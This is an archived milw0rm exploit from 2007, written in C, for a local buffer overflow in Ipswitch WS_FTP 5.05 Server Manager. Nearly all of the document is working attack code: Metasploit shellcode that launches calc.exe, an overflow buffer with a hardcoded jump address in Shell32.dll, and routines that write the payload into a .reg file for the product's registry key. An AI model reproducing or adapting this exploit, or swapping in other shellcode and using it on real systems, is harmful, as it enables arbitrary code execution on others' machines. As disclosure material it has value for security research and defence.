<html><head><title>Ipswitch WS_FTP 5.05 Server Manager Local Site Buffer Overflow Exploit</title></head><pre>/****************************************************************************
*      Ipswitch WS_FTP 5.05 Server Manager Local Site Buffer Overflow       *
*                                                                           *
*                                                                           *
* There's a buffer overflow in iftpmgr.exe that can be triggered by         *
* registering a long site command. The result is then saved in the registry *
* and every time the group is checked the bug appears.                      *
* This exploit launches calc.exe.                                           *
*                                                                           *
* Tested against Win XP SP2 FR.                                             *
* Have Fun!                                                                 *
*                                                                           *
* Coded and discovered by Marsu &lt;Marsupilamipowa@hotmail.fr&gt;                *
****************************************************************************/

#include &quot;stdio.h&quot;
#include &quot;stdlib.h&quot;

/* win32_exec -  EXITFUNC=process CMD=calc.exe Size=165 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char CalcShellcode[] =
&quot;\x29\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x26&quot;
&quot;\x45\x32\xe3\x83\xeb\xfc\xe2\xf4\xda\xad\x76\xe3\x26\x45\xb9\xa6&quot;
&quot;\x1a\xce\x4e\xe6\x5e\x44\xdd\x68\x69\x5d\xb9\xbc\x06\x44\xd9\xaa&quot;
&quot;\xad\x71\xb9\xe2\xc8\x74\xf2\x7a\x8a\xc1\xf2\x97\x21\x84\xf8\xee&quot;
&quot;\x27\x87\xd9\x17\x1d\x11\x16\xe7\x53\xa0\xb9\xbc\x02\x44\xd9\x85&quot;
&quot;\xad\x49\x79\x68\x79\x59\x33\x08\xad\x59\xb9\xe2\xcd\xcc\x6e\xc7&quot;
&quot;\x5C\x22\x86\x03\x23\x42\xce\x72\xd3\xa3\x85\x4a\xef\xad\x05\x3e&quot;
&quot;\x68\x56\x59\x9f\x68\x4e\x4d\xd9\xea\xad\xc5\x82\xe3\x26\x45\xb9&quot;
&quot;\x8b\x1a\x1a\x03\x15\x46\x13\xbb\x1b\xa5\x85\x49\xb3\x4e\x3b\xea&quot;
&quot;\x01\x55\x2d\xaa\x1d\xac\x4b\x65\x1c\xc1\x26\x53\x8f\x45\x6b\x57&quot;
&quot;\x9b\x43\x45\x32\xe3&quot;;

int main(int argc, char* argv[])
{
	FILE* regfile;
	char evilbuff[250];

	printf(&quot;[+] Ipswitch WS_FTP 5.05 Server Manager Local Site Buffer Overflow\n&quot;);
	printf(&quot;[+] Coded and discovered by Marsu &lt;Marsupilamipowa@hotmail.fr&gt;\n&quot;);
	if (argc!=3) {
		printf(&quot;[+] Usage: %s &lt;Group&gt; &lt;file.reg&gt;\n&quot;,argv[0]);
		printf(&quot;[+] ex:    %s Marsu Pilami.reg\n&quot;,argv[0]);
		return 0;
	}
	
	memset(evilbuff,'C',250);
	memcpy(evilbuff+4,CalcShellcode,strlen(CalcShellcode));
	memcpy(evilbuff+202,&quot;\x46\xE4\xBD\x7C&quot;,4);	/*00 50 00 00 in Shell32.dll. We need this to jump back to our shellcode =)
							  CALL DWORD PTR DS:[EDX+90] and our code is at 0x00500040 in DS*/
	memset(evilbuff+215,0,1);
	
	regfile=fopen(argv[2],&quot;wb&quot;);
	fprintf(regfile,&quot;Windows Registry Editor Version 5.00\r\n\r\n&quot;);
	fprintf(regfile,&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Ipswitch\\iFtpSvc\\Domains\\%s\\Commands]\r\n\r\n&quot;,argv[1]);
	fprintf(regfile,&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Ipswitch\\iFtpSvc\\Domains\\%s\\Commands\\aa]\r\n\&quot;_Executable\&quot;=\&quot;%s\&quot;\r\n&quot;,argv[1],evilbuff);
	fprintf(regfile,&quot;\&quot;_Arguments\&quot;=\&quot;%s\&quot;\r\n&quot;,evilbuff);
	fprintf(regfile,&quot;\&quot;*everyone\&quot;=dword:000000ff\r\n\r\n&quot;);
	fclose(regfile);
	printf(&quot;[+] Done. Have fun!\n&quot;);
	return 0;
	
}

// milw0rm.com [2007-04-02]</pre></html>